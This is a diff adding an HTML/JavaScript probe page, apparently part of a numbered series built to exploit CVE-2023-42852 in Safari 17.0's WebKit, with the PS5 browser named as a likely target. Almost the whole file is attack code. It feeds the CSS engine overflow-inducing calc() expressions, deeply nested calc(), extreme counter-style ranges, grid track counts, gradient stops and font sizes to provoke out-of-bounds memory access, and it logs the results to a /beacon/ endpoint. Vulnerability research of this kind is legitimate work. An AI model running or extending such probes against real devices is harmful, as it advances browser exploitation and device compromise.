@@ -1,0 +1,253 @@
+<!--
+  p687: CVE-2023-42852 — CSS calc()/counter-style bounds check bypass
+
+  CVE-2023-42852: "A logic issue was addressed with improved checks." Safari 17.1
+  fix. Present in 17.0 (605.1.15). PS5 LIKELY VULNERABLE.
+
+  Strategy: CSS numeric processing paths where integer overflow or missing bounds
+  checks could lead to an undersized allocation or OOB access. The "improved checks"
+  fix description is very broad, so we test multiple CSS numeric paths.
+
+  Patterns tested:
+  A) calc() with values that overflow 32-bit integers
+  B) Deeply nested calc() causing intermediate overflow
+  C) counter-style with large range values
+  D) CSS grid with extreme track counts
+  E) CSS gradient with extreme color-stop counts
+  F) font-size: calc() with extreme values affecting text layout buffers
+
+  CRASH_CLASS: MODERATE (potential OOB from integer overflow)
+  prior art: p608 series (ResizableArrayBuffer overflow), p615 (MetadataTable overflow)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p687</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P687-START:CVE-2023-42852-CSS-CALC-OVERFLOW');
+  var results = [];
+
+  // === SECTION A: calc() with 32-bit integer overflow ===
+  b('A:CALC-OVERFLOW');
+  try {
+    var div = document.createElement('div');
+    document.body.appendChild(div);
+
+    // Test calc expressions that overflow 32-bit int
+    var tests = [
+      'calc(2147483647px + 1px)',      // INT_MAX + 1
+      'calc(2147483647px * 2)',         // INT_MAX * 2
+      'calc(-2147483648px - 1px)',      // INT_MIN - 1
+      'calc(99999999px * 99999999)',    // large multiply
+      'calc(1px / 0.00000001)',         // divide producing huge value
+      'calc(100% * 2147483647)',        // percentage overflow
+    ];
+
+    for (var i = 0; i < tests.length; i++) {
+      div.style.width = tests[i];
+      var computed = getComputedStyle(div).width;
+      b('A:TEST-' + i + ':expr=' + tests[i].substring(5, 30) + ',computed=' + computed);
+
+      // Check if computed value is negative or zero (sign of overflow)
+      var px = parseFloat(computed);
+      if (px < 0 || isNaN(px)) {
+        b('A:OVERFLOW-SIGN:test=' + i + ',val=' + computed);
+        results.push('A:overflow-' + i);
+      }
+    }
+    div.remove();
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: Deeply nested calc ===
+  b('B:NESTED-CALC');
+  try {
+    var div2 = document.createElement('div');
+    document.body.appendChild(div2);
+
+    // Build deeply nested calc expression
+    var expr = '1px';
+    for (var i = 0; i < 100; i++) {
+      expr = 'calc(' + expr + ' + 1px)';
+    }
+    div2.style.width = expr;
+    var computed = getComputedStyle(div2).width;
+    b('B:NESTED-100:' + computed);
+
+    // Even deeper
+    expr = '1px';
+    for (var i = 0; i < 500; i++) {
+      expr = 'calc(' + expr + ' * 1.01)';
+    }
+    try {
+      div2.style.width = expr;
+      computed = getComputedStyle(div2).width;
+      b('B:NESTED-500-MULT:' + computed);
+    } catch(e2) {
+      b('B:NESTED-500-ERR:' + e2.message);
+    }
+
+    div2.remove();
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: CSS counter with extreme ranges ===
+  b('C:COUNTER-STYLE');
+  try {
+    var style = document.createElement('style');
+    style.textContent = [
+      '@counter-style extreme1 {',
+      '  system: numeric;',
+      '  symbols: "0" "1" "2" "3" "4" "5" "6" "7" "8" "9";',
+      '  range: -2147483648 2147483647;',
+      '}',
+      '@counter-style extreme2 {',
+      '  system: cyclic;',
+      '  symbols: ' + new Array(256).fill('"x"').join(' ') + ';',
+      '  range: 0 999999999;',
+      '}'
+    ].join('\n');
+    document.head.appendChild(style);
+
+    var list = document.createElement('ol');
+    list.style.listStyleType = 'extreme1';
+    for (var i = 0; i < 10; i++) {
+      var li = document.createElement('li');
+      li.textContent = 'item-' + i;
+      li.value = 2147483640 + i; // near INT_MAX
+      list.appendChild(li);
+    }
+    document.body.appendChild(list);
+
+    // Force layout
+    list.getBoundingClientRect();
+    b('C:COUNTER-RENDERED');
+
+    // Check computed counter values
+    for (var i = 0; i < list.children.length; i++) {
+      var cs = getComputedStyle(list.children[i], '::marker');
+      b('C:MARKER-' + i + ':content=' + (cs.content || 'none').substring(0, 30));
+    }
+
+    list.remove();
+    style.remove();
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: CSS grid with extreme track count ===
+  b('D:GRID-EXTREME');
+  try {
+    var grid = document.createElement('div');
+    grid.style.display = 'grid';
+    // repeat() with large count
+    grid.style.gridTemplateColumns = 'repeat(10000, 1px)';
+    grid.style.gridTemplateRows = 'repeat(10000, 1px)';
+    document.body.appendChild(grid);
+
+    // Add a few items at extreme positions
+    for (var i = 0; i < 5; i++) {
+      var item = document.createElement('div');
+      item.style.gridColumn = (9990 + i).toString();
+      item.style.gridRow = (9990 + i).toString();
+      item.textContent = 'g' + i;
+      grid.appendChild(item);
+    }
+
+    grid.getBoundingClientRect(); // force layout
+    b('D:GRID-10K-RENDERED');
+
+    // Try even larger
+    grid.style.gridTemplateColumns = 'repeat(100000, 1px)';
+    try {
+      grid.getBoundingClientRect();
+      b('D:GRID-100K-OK');
+    } catch(e2) {
+      b('D:GRID-100K-ERR:' + e2.message);
+    }
+
+    grid.remove();
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: Gradient with many color stops ===
+  b('E:GRADIENT-STOPS');
+  try {
+    var gdiv = document.createElement('div');
+    gdiv.style.width = '100px';
+    gdiv.style.height = '100px';
+    document.body.appendChild(gdiv);
+
+    // Build gradient with 1000 color stops
+    var stops = [];
+    for (var i = 0; i < 1000; i++) {
+      var pct = (i / 999 * 100).toFixed(2);
+      stops.push('rgb(' + (i%256) + ',' + ((i*7)%256) + ',' + ((i*13)%256) + ') ' + pct + '%');
+    }
+    gdiv.style.background = 'linear-gradient(' + stops.join(',') + ')';
+    gdiv.getBoundingClientRect();
+    b('E:GRADIENT-1000-OK');
+
+    // Try 10000 stops
+    stops = [];
+    for (var i = 0; i < 10000; i++) {
+      var pct = (i / 9999 * 100).toFixed(4);
+      stops.push('red ' + pct + '%');
+    }
+    try {
+      gdiv.style.background = 'linear-gradient(' + stops.join(',') + ')';
+      gdiv.getBoundingClientRect();
+      b('E:GRADIENT-10K-OK');
+    } catch(e2) {
+      b('E:GRADIENT-10K-ERR:' + e2.message);
+    }
+
+    gdiv.remove();
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: font-size calc overflow affecting text buffer ===
+  b('F:FONTSIZE-OVERFLOW');
+  try {
+    var tdiv = document.createElement('div');
+    document.body.appendChild(tdiv);
+
+    var sizes = [
+      'calc(2147483647px)',
+      'calc(999999em)',
+      'calc(100vw * 999999)',
+      'calc(1px * 2147483647)',
+    ];
+
+    for (var i = 0; i < sizes.length; i++) {
+      try {
+        tdiv.style.fontSize = sizes[i];
+        tdiv.textContent = 'A'; // single character
+        tdiv.getBoundingClientRect();
+        var cs = getComputedStyle(tdiv).fontSize;
+        b('F:SIZE-' + i + ':computed=' + cs);
+      } catch(e2) {
+        b('F:SIZE-' + i + '-ERR:' + e2.message);
+      }
+    }
+    tdiv.remove();
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === SUMMARY ===
+  if (results.length > 0) {
+    b('P687-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P687-RESULT:NO-OVERFLOW-DETECTED');
+  }
+  b('P687-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p687: CVE-2023-42852 CSS calc/counter overflow</pre></body></html>
